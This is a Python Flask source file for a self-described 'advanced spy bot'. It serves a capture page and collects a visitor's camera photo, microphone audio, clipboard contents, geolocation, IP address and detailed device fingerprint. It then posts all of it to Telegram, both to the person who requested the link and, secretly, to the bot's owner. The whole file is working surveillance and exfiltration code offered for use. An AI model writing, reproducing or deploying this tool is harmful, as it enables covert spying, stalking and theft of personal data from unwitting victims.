from flask import Flask, request, render_template, jsonify
import requests, base64, os
from io import BytesIO

app = Flask(__name__)
BOT_TOKEN = os.getenv("BOT_TOKEN")
BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID"))
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

@app.route('/capture/<int:requester_id>')
def capture_page(requester_id):
    return render_template('advanced.html', requester_id=requester_id)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    requester_id = data.get('requester_id')
    ip = request.remote_addr
    image = data.get('image')
    audio = data.get('audio')          # base64 audio (webm)
    clipboard = data.get('clipboard', '')
    location = data.get('location', {})
    battery = data.get('battery', {})
    device_info = data.get('device', {})
    network = data.get('network', {})
    fonts = data.get('fonts', [])
    orientation = data.get('orientation', {})
    touch = data.get('touch', False)

    # Build caption
    caption = f"""🎯 **ADVANCED SPY DATA**
📡 **IP**: {ip}
🔋 **Battery**: {battery.get('level')}% {'Charging' if battery.get('charging') else 'Not charging'}
🖥️ **Device**: {device_info.get('userAgent', '')[:100]}
📱 **Screen**: {device_info.get('screenWidth')}x{device_info.get('screenHeight')} | Color: {device_info.get('colorDepth')}
🌐 **Language**: {device_info.get('language')} | **Timezone**: {device_info.get('timezone')}
📡 **Network**: {network.get('effectiveType')} | Downlink: {network.get('downlink')}Mbps | RTT: {network.get('rtt')}ms
💾 **Device Memory**: {device_info.get('deviceMemory', 'unknown')} GB
🧭 **Orientation**: {orientation.get('type')} | Angle: {orientation.get('angle')}°
👆 **Touch screen**: {'Yes' if touch else 'No'}
✂️ **Clipboard**: {clipboard[:100] if clipboard else '(empty or denied)'}
🔤 **Fonts (first 5)**: {', '.join(fonts[:5])}
📍 **Location**: {location.get('lat', 'denied')}, {location.get('lon', '')}
🎙️ **Audio**: {'captured' if audio else 'denied'}
📸 **Photo**: attached below"""

    # Send photo
    if image:
        photo_bytes = base64.b64decode(image.split(',')[1])
        files = {'photo': ('cam.jpg', BytesIO(photo_bytes), 'image/jpeg')}
        requests.post(f"{BOT_API}/sendPhoto", data={'chat_id': requester_id, 'caption': caption}, files=files)
        requests.post(f"{BOT_API}/sendPhoto", data={'chat_id': BOT_OWNER_ID, 'caption': caption}, files=files)
    else:
        # No photo, send as text
        requests.post(f"{BOT_API}/sendMessage", json={'chat_id': requester_id, 'text': caption, 'parse_mode': 'Markdown'})
        requests.post(f"{BOT_API}/sendMessage", json={'chat_id': BOT_OWNER_ID, 'text': caption, 'parse_mode': 'Markdown'})

    # Send audio separately if exists
    if audio:
        audio_bytes = base64.b64decode(audio.split(',')[1])
        files_audio = {'audio': ('voice.webm', BytesIO(audio_bytes), 'audio/webm')}
        requests.post(f"{BOT_API}/sendVoice", data={'chat_id': requester_id}, files=files_audio)
        requests.post(f"{BOT_API}/sendVoice", data={'chat_id': BOT_OWNER_ID}, files=files_audio)

    return jsonify({'status': 'advanced data sent'})

@app.route('/')
def health():
    return "Advanced spy bot alive", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
